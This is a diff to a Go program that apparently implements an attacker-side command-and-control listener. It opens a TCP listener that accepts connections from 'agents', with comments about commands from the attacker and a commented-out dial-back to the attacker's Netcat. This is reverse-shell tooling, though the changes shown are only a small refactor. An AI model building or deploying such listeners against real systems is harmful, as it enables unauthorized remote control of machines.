@@ -136,7 +136,7 @@ func createNewListener() { //function to construct our listener
 
 	// Generate the listener using data from the user
 	// Create the TCP connection to your attackers Netcat
-	var ipAndPortString string = data.GetIP() + ":" + data.GetPort()
+	//var ipAndPortString string = data.GetIP() + ":" + data.GetPort()
 
 	/*
 		connection, err := net.Dial("tcp", ipAndPortString) //dial function connects to a server address, ("protocol", "IP", "Port")
@@ -150,13 +150,14 @@ func createNewListener() { //function to construct our listener
 		//println("Listener successfully started") */
 
 	//CONCURRENT TCP SERVER (LISTENER)
+	var ipAndPortString string = data.GetIP() + ":" + data.GetPort()
 	listener, err := net.Listen("tcp4", ipAndPortString) //create listener and listen over tcp protocol over user defined Ip and port
 	if err != nil {
 		fmt.Println(err.Error())
 		return
 	}
 	defer listener.Close()
-
+	println("listener started")
 	for {
 		connection, err := listener.Accept()
 		if err != nil {
@@ -165,7 +166,6 @@ func createNewListener() { //function to construct our listener
 		}
 		go handleConnection(connection)
 		count++
-
 	}
 
 	//Accept commands from attacker
@@ -181,9 +181,31 @@ func createNewListener() { //function to construct our listener
 	} */
 }
 
+/*
+func generateListener() {
+	//CONCURRENT TCP SERVER (LISTENER)
+	var ipAndPortString string = data.GetIP() + ":" + data.GetPort()
+	listener, err := net.Listen("tcp4", ipAndPortString) //create listener and listen over tcp protocol over user defined Ip and port
+	if err != nil {
+		fmt.Println(err.Error())
+		return
+	}
+	defer listener.Close()
+	println("listener started")
+	for {
+		connection, err := listener.Accept()
+		if err != nil {
+			fmt.Println(err)
+			return
+		}
+		go handleConnection(connection)
+		count++
+	}
+}*/
+
 //function to handle and process incoming connections to the listener
 func handleConnection(connection net.Conn) {
-	fmt.Print(".")
+	fmt.Print("Successfully connected to agent\n")
 	for {
 		netData, err := bufio.NewReader(connection).ReadString('\n')
 		if err != nil {
